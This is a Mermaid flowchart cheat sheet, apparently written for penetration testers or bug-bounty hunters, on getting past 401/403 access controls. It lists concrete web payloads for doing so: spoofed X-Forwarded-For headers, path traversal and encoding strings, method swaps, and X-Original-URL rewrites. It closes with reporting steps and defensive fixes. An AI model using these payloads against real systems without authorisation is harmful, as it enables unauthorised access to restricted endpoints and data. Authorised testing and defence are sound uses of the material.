%% 401/403 Bypass Expert Cheat Sheet – Structured as Flow + Checklists

flowchart TD
    A[Start: 401/403 on endpoint] --> B[Phase 1: Identify & Baseline]
    B --> C[Phase 2: Systematic Bypass Testing]
    C --> D[Phase 3: Optional Automation]
    D --> E[Phase 4: Validate & Escalate]
    E --> F[Phase 5: Report & Document]

    %% Phase 1
    subgraph Phase_1[Phase 1 – Identify the Target Endpoint]
        B1[Find restricted endpoints\n- /admin, /api/internal, /authorization-response\n- Any 401/403 resources]
        B2[Capture baseline request in Burp Repeater\n- Status: 401/403\n- Body + content-length\n- Headers]
        B1 --> B2
    end

    %% Phase 2 – main testing hub
    subgraph Phase_2[Phase 2 – Systematic 401/403 Bypass Testing]
        direction TB

        C0[Use Burp Repeater\nChange ONE thing per test\nCompare status & content-length]

        C1[Host Header Bypass]
        C2[HTTP Method Bypass]
        C3[IP Spoofing Headers]
        C4[Path Encoding / Traversal]
        C5[URL Parameter Tricks]
        C6[Header Injection / Rewrite]
        C7[Content-Type Bypass]
        C8[API Version / Endpoint Variant]
        C9[Unicode & Special Encoding]

        C0 --> C1 --> C2 --> C3 --> C4 --> C5 --> C6 --> C7 --> C8 --> C9

        %% Detailed checklists as notes

        C1:::caseNote --> C1n["Checklist – Host Header
        - Host: target.com → Host: localhost
        - Host: target.com  (lowercase 'host:')
        - Host:target.com   (no space after colon)
        - Host: <tab>target.com
        - Host: target.com sensitive-file.txt
        - Host: target.com:FUZZ (ports; use Intruder)"]

        C2:::caseNote --> C2n["Checklist – HTTP Method
        - GET → POST, PUT, DELETE, HEAD, PATCH
        - Lowercase: get /endpoint HTTP/1.1
        - Random: ANYTHING /endpoint HTTP/1.1
        - Mixed case: GeT, PoST, gEt (Varnish/odd parsers)
        - Add tab before method if supported"]

        C3:::caseNote --> C3n["Checklist – IP Spoofing
        Test individually, then in combinations:
        - X-Forwarded-For: 127.0.0.1
        - Two X-Forwarded-For (one empty)
        - X_Forwarded_For: 127.0.0.1
        - Forwarded: for=127.0.0.1
        - X-Real-IP / X-Client-IP / True-Client-IP
        - CF-Connecting-IP
        - X-ProxyUser-Ip
        - X-Custom-Ip-Authorization"]

        C4:::caseNote --> C4n["Checklist – Path Encoding/Traversal
        - /%2e/endpoint
        - /%2e%2e/endpoint
        - /..;/endpoint or /authorization-response..;/
        - /endpoint%00  (null byte)
        - /endpoint%0d  (CR)
        - /endpoint\\..\\..
        - /#//../endpoint
        - /.//endpoint, /./endpoint
        - /200-OK/..//endpoint
        - /endpoint;/../200-OK"]

        C5:::caseNote --> C5n["Checklist – URL Parameter Tricks
        - /endpoint?
        - /endpoint??
        - /endpoint.json, /endpoint.php, /endpoint.xml
        - /endpoint%2e.php%3b.jpg
        - Tomcat matrix param: /api/v4;X=Y/endpoint"]

        C6:::caseNote --> C6n["Checklist – Header Injection / Rewrite
        - GET /  + X-Original-URL: /admin
        - X-Rewrite-URL: /admin
        - X-Override-URL: /admin
        - Uppercase paths: /AUTHORIZATION-RESPONSE/
        - URL-encoded first char: /%61dmin, /%61pi (HAProxy/odd parsers)"]

        C7:::caseNote --> C7n["Checklist – Content-Type
        - Content-Type: 0
        - Content-Type: application/json
        - Content-Type: application/xml
        - Compare: does status/body change?"]

        C8:::caseNote --> C8n["Checklist – API Version / Endpoint Variant
        For /api/v4/admin:
        - /api/v3/admin
        - /api/v2/admin
        - /api/v1/admin
        - /api/v4.1/admin, /api/v4.0/admin
        Also test:
        - /admin, /admin/, /admin?, /admin.php"]

        C9:::caseNote --> C9n["Checklist – Unicode / Special Encoding
        - Right-To-Left Override: /%2e%80%aeesnopser-noitazirohtua/
        - Mixed encodings with dots, slashes, semicolons
        - Combine with previous path tricks if needed"]

    end

    %% Phase 3
    subgraph Phase_3[Phase 3 – Automation (4-ZERO-3 / Tools)]
        D1[Run 4-ZERO-3 or similar tool on 401/403 endpoints]
        D2[Compare results manually\n- Look at status changes\n- Compare content-length of 403 vs 200]
        D1 --> D2
    end

    %% Phase 4
    subgraph Phase_4[Phase 4 – Validation & Escalation]
        E1[Confirm bypass
        - Do you now get 200/302 instead of 403?
        - Does response body clearly differ?]
        E2[Prove impact
        - Access restricted data
        - Perform restricted action
        - Take screenshots / save responses]
        E3[Try chaining
        - Combine Host + Method
        - Method + IP header
        - Path encoding + header rewrite]
        E1 --> E2 --> E3
    end

    %% Phase 5
    subgraph Phase_5[Phase 5 – Report]
        F1[Prepare report
        - Title: “403 Bypass via <technique> on <endpoint>”
        - Include raw bypass request + normal 403 request]
        F2[Explain impact
        - What restricted area/function is now reachable?
        - Data exposure / admin access / policy bypass]
        F3[Recommendations
        - Enforce access control in app logic, not proxy
        - Normalize paths & methods consistently
        - Ignore client-supplied IP/override headers for auth]
        F1 --> F2 --> F3
    end

    %% Styling
    classDef caseNote fill=#111111,stroke=#444444,color=#e0e0e0,font-size:10px;
